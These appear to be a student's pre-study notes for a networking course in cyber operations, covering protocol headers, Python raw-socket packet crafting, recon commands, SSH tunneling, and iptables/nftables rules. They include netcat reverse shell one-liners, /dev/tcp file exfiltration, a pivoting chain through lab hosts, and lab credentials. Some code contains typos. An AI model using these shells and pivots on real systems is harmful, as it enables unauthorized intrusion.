Networking Pre Study

https://net.cybbh.io/public/networking/latest/index.html

blue space all friendlies, mapping and networkinginto red space which is the opposition.

    ##FUNDAMENTALS

Binary     Hex     Decimal


packets, headers, and their sizes:
32 bits is known as a word
4 bytes make up a word ( 4 bytes in an ip4v address)
first byte in an ip header length is 45
double word 64 bits
quad word 128 bits

if you see base 64 try to decode it
only reason for base 64 here is encode or decode.

Encapsulation and decapsulation

please do not throw sausage pizza way ( pdntspa )

sox proxy is used to maintain and push protocols through an established session
proces includes stripping and adding info to packet header in order to tell where it is going.

Layer 1 PHYSICAL
Layer 2 DATA LINK Layer (arp, vlan, and ethernet)
    -sublayers  (MAC media access control (layer 2 to layer 1) and LLC Logical Link Control)
    -switch looks at just the destination mac to send it out faster only looking at 6 bytes compared to looking at 14 bytes ( cut through forwarding)
  -if you see hex dd hex ipv6, if you see hex 8100 it will be standard vlan tag, hex 88a8 nonstandard vlan tag 

arp used for ip to mac
proxy arp - if router has ip address then router will respond with its mac address
gratuitous arp attack - poison arp cache by sending out a specific malicious host repetitively till something is sent back.
Command: arp -a (shows arp cache) or 'ip neighbor'

IPV4 Header:
DSCP field determines what type of traic it is such as voice (ECN field at tht end is meant for traffic congestion)
Value for DSCP field is the normal value times 4
linux 64
windows 128
cisco 254

Fragmentation Process:
RES DF MF |   Offset
offset changes by taking the data value and divding by 8
for the value defragged will keep adding for what the main value was divided by 

IPV6 Header:

trafic class portion is similar to the dscp field
flow level will tell the which packets need to stay on the same path such as high priority information
hop limit is the same thing as ttl

ICMP Header:

all part of layer 3


Zero Configuration Networking:

Ipv4 auto configuration
-APIPA
-RFC 3927 
IPv6 auto ocnfiguration
-SLAAC (stateless address auto-config)
-RFC 4862

Transport Layer (4):

TCP and UDP

TCP Flags :
CWR, ECE, URG, ACK, PSH, RST, SYN, FIN
Collection of Exceptionally Unskilled Attackers Pester Real Security Folks
(Three Way Handshake)

UDP Headers:

Source, destination, length, checksum each 16 bits
no standardized response through udp
Femeral ports: femeral high port means temporrily open ( short lived only open the amount of time you need to use them)

Session Layer(5):
Socks, NetBIOS, PPTP/L2TP, RPC
                    ^
                VPN Protocol
Socks is used for client server exchange messages

Presentation Layer(6):
translation, formating, encoding, encryption, compression
This layer is for providing information to the user or system in order to coherently run things.



S. IP = 192.168.14.2

filter for source ip 

ip[2:4] = "192.168.14.2"

ip[2:4] = 0xC0 0xA8 0x0E 0x02

ip src = 192.168.14.2

answer: ip[12:4] & 0xFFFFFFFF = 0xC0A80E02

Layer 2 switching technologies:

switch operation: 
fast forward ( only destination MAC ), fragment free( First 64 bytes ), store and forward( Entire Frame and FCS )

Fast Forward is most commonly seen

CAM TABLE 

IEEE 802.1AD "Q-in-Q"
double tagging  0x88A80002                 followed by  \    0x81000064
non standard double tagging 0x91000002     followed by  /

Spanning tree protocol:
Root descision process

1. elect root bridge
2. identify the root ports on non root bridge
3. identify the designated port for each segment
4. set alternate ports to blocking gate

helps with a broadcast storms hitting all switches causing duplicate packets being forwarded out of every port.
'one packet forwared till switches crash'
spanning tree protocol doesnt allow this forwarding
ports going to the router are brute ports.

Layer 2 discovery protocols:
cisco discovery protocol (CDP)
foundry discovery protocol (FDP)
link layer discovery protocol(LLDP)

DTP dynamic trunking protocol:
different kinds of switch ports (access port and trunk port)
trunk ports: help switches transmit vlans to each other, are for devices that need to be aware of vlans being passed. not typically hosts
access ports: hosts have access ports, dont need to know their part of a vlan

switches for ease of use want devices to automatically configure themselves which is why you would use dynamic trunking protocol

Vlan Trunking Protocol:
allows one switch to act as server and passes all info to it. passes out updates.

Port security:
modes: shutdown, restrict, protect

Layer 3 routing technologies:

routers switch broadcast domains
routing table is a table of networks it knows where to send routing info to

First hop redundancy protocols

RFC: white paper about howa protocol works. (standardized throughout the industry) (like syslog and how that protocol works)

Administrative distance
-how routers rank the trustworthiness of a route (the higher the ranking the more trust)

Static routing: literally putting in you get ot such and such network through a given host out of a given port (have to setup oth sides of it)
advantages: no update sent, no bandwidth to use, data path is predetermined
disadvantages: time consuming, administrator must intervene to fix, does not scale for large networks

Dynamic routing: different kinds of routing protocols, typically see distance vector (how far does this traffic have to travel) (Ripv2 EIGRP)
advantages: easy to configure automatically provide updates, intervention not needed, scales very well

IGP and EGP:
BGP uses autanomous systems
border router in between to translate data

IANA world system through internet breaks up into different terrains such as ARIN (U.S. IP's)

IEEE controls creation of protocols we typically use lan wifi ethernet etc...

Link state convergence determines the best path to follow and everything goes with that compared to distcne vecotr where not every router knows every route.
link state they all commnicate with each other and deterine the best path and state.

BGP:
road map of the internet
routes between an AS
only cares about shorter routes

can cause bgp hijacking for illegitimate advertsiing of addresses.

BGP encryption and find hijacking by change of ttl of incoming packets has occured. 23 hops becomes 5 hops is suspicious.

COMMANDS:

To view your IP address and interface information:
        a. current =        ip address (ip addr)
        b. deprecated =     ifconfig

    2. To view your ARP cache:
        a. current =        ip neighbor (ip nei)
        b. deprecated =     arp -a

    3. To view open TCP and UDP sockets:
        a. current = 
            i. TCP =        ss -antlp
            ii. UDP =       ss -anulp
        b. deprecated =     netstat

    4. To view active processes:
        a. static =         ps -elf
        b. real-time =      top or htop

    5. To open file manager from the command line or X11 connection:
        a. nautilus
        b. pcmanfm

    6. Web Browsers:
        a. Firefox
        b. Chromium
        c. Konqueror

    7. To open images from the command line or X11 connection:
        a. Eye of Gnome =                   eog [file]
        b. Nomacs =                         nomacs [file]
        c. Eye of Mate =                    eom [file]
        d. GNU Image Manipulation Program = gimp [file]

    8. Network scanning:
        a. nmap
            -sT = TCP Full connection
            -sS = TCP SYN scanning
            -Pn = Disable ping sweep
            -sU = UDP scanning
        b. zenmap
        c. netcat
            TCP: nc -nzvw1 10.10.0.40 21-23 80
            UDP: nc -unzvw1 10.10.0.40 53 69
        d. ping
        e. traceroute

    9. Network Utilization:
        a. iftop
        b. iptraf-ng

    10. Packet Manipulation (requires root privileges):
        a. scapy
        b. hping3
        c. yersinia     yersinia -G

    11. Packet Sniffing (requires root privileges):
        a. Wireshark
        b. tcpdump
        c. p0f
        d. tshark

    12. Banner Grabbing:
        a. netcat
            Client: nc 10.10.0.40 22
            Listener: nc -lvp 1234
        b. telnet
            telnet 10.10.0.40
        c. wget
            wget -r http://10.10.0.40
            wget -r ftp://10.10.0.40
        d. curl
            curl http://10.10.0.40
            curl ftp://10.10.0.40

    13. DNS Query:
        a. whois
        b. dig
            Records:
                A - IPv4
                AAAA - IPv6
                NS - Name Server
                SOA - Start of Authority
                MX - Mail Server
                TXT - Human readable message

    14. Remote access:
        a. ssh
            ssh student@10.10.0.40
            ssh student@10.10.0.40 -p 2222
        b. telnet
            telnet 10.10.0.40
            telnet 10.10.0.40 23

    15. File Transfer:
        a. scp
            scp student@10.10.0.40:file .
            scp file student@10.10.0.40:
        b. netcat
            nc 10.10.0.40 1234 < file
            nc -lvp 1234 > file


##PACKET CREATION AND SOCKET COMMUNICATION

Different kinds: 
stream sockets: connection oriented data (pcp)
datagram socets: connectionless (udp)
raw sockets: crafting all headers you need putting data directly on the wire (sending very specific data)

* sockets arent just for networking

User Space Sockets -system calls

        -Stream Sockets

        -Datagram Sockets

Kernel Space Sockets -operate directly with hardware (commonly require sudo with the run access permission)

        -Raw Sockets

PYTHON##
Libraries
-import socket
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
        socket.socket([*family*[,*type*[*proto*]]])
        family constants should be: AF_INET (default), AF_INET6, AF_UNIX    

        type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW

        proto constants should be: 0 (default), IPPROTO_RAW

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#this can also be accomplished by using s = socket.socket() due to AF_INET and SOCK_STREAM being defaults

ipaddr = '127.0.0.1'
port = 54321

s.connect((ipaddr, port))

# to send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line. (Like hitting enter)
s.send(b'Hello\n')

# It is recommened that the buffer size used with recvfrom is a power of 2 and not very large
response, conn = s.recvfrom(1024)

#in order to receive a message that is sent as a bytes-like object, you must decode it into UTF-8 (default)
print (response.decode())


s.close()


DATAGRAM SOCKET

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ipaddr = '127.0.0.1'
port = 54321

s.sendto(b'Hello\n', (ipaddr, port))

response, conn = s.recvfrom(1024)

print(response.decode())

##RAW SOCKET

import socket

# for system level cvommands
import sys

# lib for establishing packet structure (allows direct access)

from struct import *

# create socket

try:
        sys.exit()
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

except socket.error as msg:
        print(msg)

packet = ''

src_ip = '10.0=1.0.2'
dst_ip = '10.3.0.2'

# header info

ip_ver_ihl = 69     #decimal conversion of 0x45 for version and IHL
ip_tos = 0          #combination of DSCP and ECN Fields
ip_len = 0          #kernel will fill in the acgtual length of the field
ip_id = 12345       #sets ip id for the packet
ip_frag = 0         #sets ip fragmentation off
ip_ttl = 64         #determines the TTL of the packet when leaving the machine
ip_proto = 16       #set chos protocol. if tcp (6_ or udp (17) additional headers would be required.
ip_check = 0        #kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)    #convert src ip to 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)    #convert dst ip to 32 bit binary number

ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

message = b'This is a message'
packet = ip_header + message

#send packet
s.sendto(packet, (dst_ip, 0))

##RAW TCP SOCKET
import socket

# for doing an array in tcp connection
import array

# for system level cvommands
import sys

# lib for establishing packet structure (allows direct access)

from struct import *

# create socket

try:
    
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

except socket.error as msg:
        print(msg)
        sys.exeit()

packet = ''

src_ip = '10.10.0.40'
dst_ip = '172.16.40.10'

# header info

ip_ver_ihl = 69     #decimal conversion of 0x45 for version and IHL
ip_tos = 0          #combination of DSCP and ECN Fields
ip_len = 0          #kernel will fill in the acgtual length of the field
ip_id = 2020       #sets ip id for the packet
ip_frag = 0         #sets ip fragmentation off
ip_ttl = 64       #determines the TTL of the packet when leaving the machine
ip_proto = 6       #set chos protocol. if tcp (6_ or udp (17) additional headers would be required.
ip_check = 0        #kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)    #convert src ip to 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)    #convert dst ip to 32 bit binary number

ip_header = pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

# TCP header fields
tcp_src = 54321         #source port
tcp_dst = 1234          #dst port
tcp_seq = 90210           #sequence number
tcp_ack_seq = 30905         #tcp ack sequence number
tcp_data_off = 5        #data offset specifying size of tcp header in 4-byte words
tcp_reserve = 0         #3 reserve and + ns flag in reserve field
tcp_flags = 0           #tcp flags field before bits are turned on
tcp_win = 65535         #maximum allowed window size
tcp_chk = 0             #tcp checksum which will b e calculated later
tcp_urg_ptr = 0         #urgent pointer only if urg flag is set

# combine the tcp offset and reserve fields left shifted 4 bit tcp ofset and reserve field
tcp_off_res = (tcp_data_off << 4) + tcp_reserve

# TCP flags by bit starting from right to left
tcp_fin = 0
tcp_syn = 1
tcp_rst = 0
tcp_psh = 0
tcp_ack = 0
tcp_urg = 0
tcp_ece = 0
tcp_cwr = 0

#combine the tcp flags by left shifting the bit locations and adding the bits together

tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5) + (tcp_ece << 6) + (tcp_cwr << 7)

# The ! in the pck format string means network order
tcp_hdr = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win, tcp_chk, tcp_urg_ptr)

user_data = b'Hello Is this hidden?'

#psudo header fields
src_address = socket.inet_aton(src_ip)
dst_address = socket.inet_aton(dst_ip)
reserved = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_hdr) + len(user_data)

#pack the psudo header and combine with user data
ps_hdr = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_length)
ps_hdr = ps_hdr + tcp_hdr + user_data

def checksum(data):
        if len(data) %2 != 0:
                data += b'\0'
        result = sum(array.array("H", data))
        result = (result >> 16) + (result & 0xffff)
        result += result >> 16
        return (~result) & 0xffff

tcp_chk = checksum(ps_hdr)

#pack the tcp header to fill in the correct checksum remember checksum is NOT on network byte order
tcp_hdr = pack('!HHLLBBH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win) + pack('H', tcp_chk) + pack('!H', tcp_urg_ptr)

#combine all the headers and the user data

packet = ip_header + tcp_hdr + user_data

#send the packet

s.sendto(packet, (dst_ip,0))




T2
Hostname: BLUE_DMZ_Host-1
IP: 172.16.1.15
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Send a Stream Socket Message to this host

cat /etc/hosts
cat/etc/resolv.conf
netstat -ntulp    \   open ports
ss -ntulp         /

ps -elf  (running service procs
who /w   (other users logged in

ifconfig   \
ip addr     >  Int ip's
ip a       /

arp -a    \
ip neigh  >  arp cache
ip n      /
(drp) route 
ip route
ip r


https://www.bestbuy.com/site/corsair-vengeance-i7400-gaming-desktop-intel-core-i7-13700k-32gb-ddr5-5600-mhz-memory-nvidia-geforce-rtx-4080-2tb-ssd-black/6539761.p?skuId=6539761
https://www.bestbuy.com/site/cyberpowerpc-gamer-supreme-gaming-desktop-intel-core-i9-13900kf-32gb-memory-nvidia-geforce-rtx-4080-1tb-hdd-2tb-ssd-black/6523676.p?skuId=6523676
https://www.bestbuy.com/site/cyberpowerpc-gamer-supreme-gaming-desktop-amd-ryzen-9-7900x-32gb-memory-nvidia-geforce-rtx-4080-1tb-ssd-black/6526066.p?skuId=6526066

**to get to outside router must use a float ip to access router
go to port on device must got to the loopback 
 (ports get opened up on your loopback such as 22 21 80)
0.0.0.0 (quad 0's) think as wildcards accepts any ip address 

login to a router use vyos as username (172.16.20.1 for instance)
ping sweep on linux (for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done)
nmap - nmap -vv 172.16.20.0/24 -p 21-21,80 | egrep -v filtered     (takes out anything that is filtered)
nmap -Pn 172.16.20/24 (deafult nmaps top 1000 ports) 
nmap - nmap -vv 172.16.20.0/24 -p 21-21,80 | egrep "open" -C4
if you see vyos should know its a router
config command: show int

Banner Grabbing:
nc <ip> <port>
'good for broad sweeps'
Web Request:
wget localhost 
wget -r localhost
wget -r ftp://localhost

Get URL:
curl localhost (send url request and grabs first thing) --see if its a web page

telnet alternate ports:
telnet <ip> <port>

T1
Hostname: networking-ctfd-2.server.vta
Record Type: TXT
IP: UNKNOWN
Ports: 53
Action: interrogate DNS records

Red Boundry Router
Hostname:
IP: 172.16.120.1
Ports: 22
Username: vyos
Password: password
Action: Use as start point and Perform Passive/Active Reconnaissance

T2
Hostname: UNKNOWN
IP: 172.16.182.110
Action: Perform Active Reconnaissance

T3
Hostname: UNKNOWN
IP: 172.16.140.33
Action: Perform Active Reconnaissance
ports: 2000,2011,2200,2250
T4
Hostname: UNKNOWN
IP: 172.16.182.106
Action: Perform Active Reconnaissance

T5
Hostname: UNKNOWN
IP: 172.16.182.114
Action: Perform Active Reconnaissance

T6
Hostname: UNKNOWN
IP: 172.16.182.118
Action: Perform Active Reconnaissance

T7
Hostname: UNKNOWN
IP: 172.16.140.35
Action: Perform Active Reconnaissance



2000,2011,2200,2246,2247,2250,2254,2269,2277,2290,2619,2645,2660,2664,2675,2687,2689,2710,2712,2718,2720,2722,2748,2797,2801,2803,2804,2814,2852,2856,2879,

##DATA TRANSFER MOVEMENT AND REDIRECTION

Common tranfer methods: tftp(UDP), ftp(active and passive), dftp. scp

TFTP:
UDP transport
Very Small and Simple
Insecure

FTP:
RFC 959
TCP transport
multipe tcp connections
authent through clear text
insecure

Active vs Passive:
In active the computer reaches to you
while in passive you end to comuter and allow stuff back
**passive is good for passing through ACL's

SFTP:
Secure file transfer protocol
TCP transport (TCP Port 22)
symmetric and asymmetric encryption
authent through sign in
interactive terminal access

FTPS:
TCP transport(port 443)
ssl/tls encryption
authent user/pass
interactive terminal access

ssh to a computer with a different port:
ssh user@host -p <port>

Scp Syntax:
Download a file from a remote directory to a local directory

$ scp student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp secretstuff.txt student@172.16.82.106:/home/student

Copy a file from a remote host to a separate remote host

$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

SCP Syntax w/ alternate SSHD
Download a file from a remote directory to a local directory

$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

SCP Syntax through a tunnel

ssh student@172.16.82.106 -L 1111:localhost:22 -NT

Download a file from a remote directory to a local directory

$ scp -P 1111 student@localhost:secretstuff.txt /home/student

Upload a file to a remote directory from a local directory

$ scp -P 1111 secretstuff.txt student@localhost:/home/student

#TOOLS

NETCAT:
used for inbund outbound connections
troubleshooting  sending teceiving data

NETCAT: Client to listener file transfer

Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

NETCAT: Listener to Client file transfer

Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

NETCAT Relay Demos

On Client Relay:

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe

examples:
nc 172.16.82.115 6789 0< mypipe | nc 10.10.0.40 5556 1> mypipe
nc -lp 6789 0< mypipe | nc 10.10.0.40 5556 1> mypipe

On Listener2 (sends info):

nc -l -p 9002 < infile.txt

On Listener1 (receives info):

nc -l -p 9001 > outfile.txt

Writes the output to listener1 and listener2 through the named pipe

Hosts without Netcat:

File Transfer with /dev/tcp

On the receiving box:

nc -l -p 1111 > file.txt

On the sending box:

cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.


Reverse shell using NETCAT

When shelled into the remote host using -c :

nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.

/bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.

nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.

nc -l -p <any unfiltered port> -e /bin/bash

##SSH TUNNELING/PORT FORWARDING

*you can tunnel other services through ssh including unsecure ones

remote port forward opens port on remote machine
local port forward opens port on local machine

**SSH Local Port Forwarding

    Syntax

ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT (non interactive no terminal)

or

ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT (non interactive no terminal)

can use ssh to encrypt a normal http connection

Port Numbering Convention: 
port starts with 4, student number determine snext two (41900-41999)
    -anytime opening or binding a port using port forwarding always bound to loopback address
Examples:
IH -> Tobias -> Colby -> Steve -> Bart -> dj

Local Port Forwarding

1.
(new session)
ssh -L 41901:127.0.0.1:80 user@tobiashost -NT (command sent to tobias host)
wget -r 127.0.0.1:41901
2.
(new session)
IH > ssh tobias@tobias -L 41901:colbyip:22 -NT
IH > ssh -p 41901 colby@127.0.0.1  -test colby connection
IH > ssh -p 41901 colby@127.0.0.1 -L 41902:steve:25 -NT
IH > telnet 127.0.0.1 41901  -test steves connection
(port 22 filtered on steve and theres another host)
    Continues with remote port forwarding
Steve > ssh colby@colbyhost -R 41999:127.0.0.1:22 -NT
IH > ssh -p 41901 colby@127.0.0.1 -L 41903:127.0.0.1:41999 -NT
IH > ssh -p 41903 steve@127.0.0.1
Steve > ssh steve@127.0.0.1 -R 41998:dj:25 -NT
Steve > telnet 127.0.0.1 41998
IH > ssh -p 41903 steve@127.0.0.1 -L 41904:127.0.0.1:41998 -NT
IH > telnet 127.0.0.1 41904
    Continued with Dynamic port forwarding
IH > ssh -p 41903 steve@127.0.0.1 -D 9050 -NT
IH > proxychains wget -r 127.0.0.1
IH > proxychains nmap -Pn <bartsip>
IH > proxychains wget -r ftp://Bart
IH > proxychains wget -r Bart
IH > proxychains telnet Bart
Steve > ssh colby@colby -p 41997:bart:23 -NT
Colby > telnet 127.0.0.1 41997
IH> ssh -p 41901 colby@127.0.0.1 -L 41905:127.0.0.1:41997 -NT
IH > telnet 127.0.0.1 41905
Bart > ssh steve@stevehost -R 41996:127.0.0.1:22 -NT
IH > ssh -p 41903 steve@127.0.0.1 -L 41906:127.0.0.1:41996 -NT
IH > ssh -p 41906 Bart@127.0.0.1 -D 9050 -NT
IH > proxychains nmap -Pn joshhost


Remote Port Forwarding

allows to open a port on the remote system to forward trafic

Remote Forward Sybtax: 
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT

or

ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

Dynamic Port Forwarding:

allows the use of scripts and other userspace programs through tunnel

tool called proxy chain send tcp based traffic to configured port, and tcp traffic thaytcomes out to any tcp service port will come out. 
(allows you to use nmap scans through a proxy chain on other hosts)
Syntax:
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT


Entry Float IP: 10.50.43.190

Task 3 - Donovian Tunnels Training: dig_dug_dig_dug

    Your Network Number is N (Given by Instructor)

    Credentials: net{N}_studentX:passwordX

    X is your student number

    T3 (Atropia) Float IP address is - 10.50.42.216


    T4 (Pineland) Float IP address is - 10.50.44.211 (Note - You can only telnet here to act as an insider, this will not be a routed path)

##NETWORK ANALYSIS

data types: 
full packet capture  data
session data 
sflow
netlow
statistical data
packet string data
alert data (something that was not expected)
log data (something that was already expected)

Data collection devices:
    Sensors : (In Line and Passive)



Methods of Data Collection:
TAP (direct connection)
SPAN (setup on switch routers) (copies and forwards info out another port)
ARP Spoofing (MitM) 

Anomaly detection:
Indicators ofAttack (IOA)
proactive 
focus on the intent 

Indicator of compromise (IOC)
Reactive
forensic evidence
provides information that can change

Indicators:
executable files
NOP sled
repeated letters
well known signatures
mismatched protocols
unusual traffic
large amounts of traffic with unusual times

##NETWORK FILTERING
(firewall side of things)
Host and Network filtering are two different things

Prac app for filtering:
emial addresses for spam (Layer 7)
computer applications
mac filtering for known computers (layer 2)
network traffic

Reasons:
can decrease load on infrastrcutre
ensure eficient data flow
ensure intended recipients
obfuscate network internals
lead to another network before reaching internals to prevent mitigate damage and hide behind layers

Devices:

Switch (layer 2 and 3)
Router (layer 3 and 4)
Proxies (layer 3-7)
IDS (layers 3-7)
Host Based Firewall (layers 3-7)
Network Firewall (layers 3-7)

Concepts :
Whitelist (implicit deny) vs Blacklist (let everything in)

default implicit and explicit rules
Network device operation modes:
    Routed
    Transparent (doesnt allow or route but can filter ussualy layer 2)

Concepts:
Intrusion defense
    IDS - 
    IPS - 
filtering device placement
firewall filtering methods
    stateless packet filtering (layer 3+4)
    stateful inspection (layer 4)
    application layer (Layer 7)

A: First part of network before entering PLACE A FIREWALL OR ACL'S
B or D: IPS on the line  
G or H: IDS off the line (not filtering all the traffic just observing) 
J: Proxy for anything from ssh to telnet or other service, want a service deeper in your network but access from the outside (has to go through the proxy to reach out to the inernet) 
E and F: Firewall in case an internal breach happens protect lan 1 from lan 2


**use port forwarding to switch ports once through the internet


traffic direction:
    Traffic originating from the localhost to the remote-host

    Return traffic from that remote-host back to the localhost.

    Traffic originating from the remote-host to the localhost

    Return traffic from the localhost back to the remote-host.

##Host Based Filtering

NetFilter Framework (stateless and stateful)
tools:
ip tables
nf tales
NAT: The ip is translated into the internal network regarding one ip while it conserves ip's from the outside network.
PAT: same thing but with port numbers therefore you can have multiple id addresses (changes fields on the ip header).
Can use this for packet manipulation to allow certain things into the router.

In linux when you want to get into a process you hook it, access a proccess running.
pre set hooks for net filter:
Netfilter hooks

    NF_IP_PRE_ROUTING → PREROUTING

    NF_IP_LOCAL_IN → INPUT

    NF_IP_FORWARD → FORWARD

    NF_IP_LOCAL_OUT → OUTPUT

    NF_IP_POST_ROUTING → POSTROUTING

tables - ruleset that will apply (chains)
chains - contains rules
each chain is set to a different location with a hook.
can hook into different parts such as the iptables flow diagram.


Post-Routing: change source ip address 
if done at pre routing will affect anything comeing to you (potential self sabotage)
Pre-Routing- change destination ip (if changes at post already sent out the wrong interface)

Configuring IP Tables:

Netfilter paradigm

    tables - contain chains

    chains - contain rules

    rules - dictate what to match and what actions to perform on packets when packets match a rule


IPtables
Common iptable options
T51 iptables options
iptables syntax

iptables -t [table] -A [chain] [rules] -j [action]

Rules:

-i or -o [iface]
-s or -d [ip.add | network/mask]
-p [protocol(in ipv4 header)]

-m is used with:
  state --state [state]
  mac [--mac-source | --mac-destination] [mac]
  tcp | udp [--dport | --sport] [port | port1:port2]
  multiport [--sports | --dports | --ports]
                [port1,[port2,[port3:port15]]]
  bpf --bytecode [ 'bytecode' ]

[action] - ACCEPT, REJECT, DROP

Modify iptables

    Flush table

    iptables -t [table] -F

    Change default policy

    iptables -t [table] -P [chain] [action]

    Lists rules with rule numbers

    iptables -t [table] -L --line-numbers

    Lists rules as commands interpreted by the system

    iptables -t [table] -S

    Inserts rule before Rule number

    iptables -t [table] -I [chain] [rule num] [rules] -j [action]

    Deletes rule at number

    iptables -t [table] -D [chain] [rule num]

Configuring nftables
nftable families

    ip - IPv4 packets

    ip6 - IPv6 packets

    inet - IPv4 and IPv6 packets

    arp - layer 2

    bridge - processing traffic/packets traversing bridges.

    netdev - allows for user classification of packets - nftables passes up to the networking stack
    (no counterpart in iptables)

iptables syntaxiptables -t [table] -A [chain] [rules] -j [action] Rules: -i or -o [iface] -s or -d [ip.add | network/mask] -p [protocol(in ipv4 header)] -m is used with: state --state [state] mac [--mac-source | --mac-destination] [mac] tcp | udp [--dport | --sport] [port | port1:port2] multiport [--sports | --dports | --ports] [port1,[port2,[port3:port15]]] bpf --bytecode [ 'bytecode' ] [action] - ACCEPT, REJECT, DROP

Syntax Example:
sudo iptables -I INPUT -p tcp --dport 22 -j ACCEPT (allow ssh to server)
sudo iptables -I OUTPUT -p tcp --sport 22 -j ACCEPT (allow ssh back to you)
sudo iptables -P INPUT DROP (will change to a whitelist and default to drop all traffic)

Allow terminator access:

sudo iptables -I INPUT -p tcp -m multiport --ports 6010,6011,6012 -j ACCEPT
sudo iptables -I OUTPUT -p tcp -m multiport --ports 6010,6011,6012 -j ACCEPT

Only allow new and established connection through http

sudo iptables -A INPUT -p tcp -m multiport --ports 80 -m state --state NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp -m multiport --ports 80 -m state --state NEW,ESTABLISHED -j ACCEPT

Allow pinging from this host:

sudo iptables -I OUTPUT -s 10.10.0.40 -p ICMP -m icmp --icmp-type 8 -j ACCEPT
sudo iptables -I OUTPUT -s 10.10.0.40 -p ICMP -m icmp --icmp-type 0 -j ACCEPT
sudo iptables -I INPUT -d 10.10.0.40 -p ICMP -m icmp --icmp-type 0 -j ACCEPT
sudo iptables -I INPUT -d 10.10.0.40 -p ICMP -m icmp --icmp-type 8 -j ACCEPT

find list numbers to delete or reference:

sudo iptables -L -n --line-number
sudo iptables -D INPUT 4

NFTABLES:

netdev: similar to a hook netdev hooks on ingress

Chain types:
filter    -
route    - 
nat    - 

Table Creation:

sudo nft add table ip TEST
Create chains:
sudo nft add chain ip TEST OUTPUT { type filter hook output priority 0\; policy accept\; }
sudo nft add chain ip TEST INPUT { type filter hook input priority 0\; policy accept\; }

List rules:
sudo nft list ruleset

**case sensitive
sudo nft add rule ip TEST OUTPUT tcp dport {22, 6010, 6011, 6012} ct state {new, established} accept
sudo nft add rule ip TEST INPUT tcp dport {22, 6010, 6011, 6012} ct state {new, established} accept

sudo nft add rule ip TEST OUTPUT tcp sport {22, 6010, 6011, 6012} ct state {new, established} accept
sudo nft add rule ip TEST INPUT tcp sport {22, 6010, 6011, 6012} ct state {new, established} accept

sudo nft flush table ip TEST

**DO NOT CONFIGURE INTERNET HOST


















































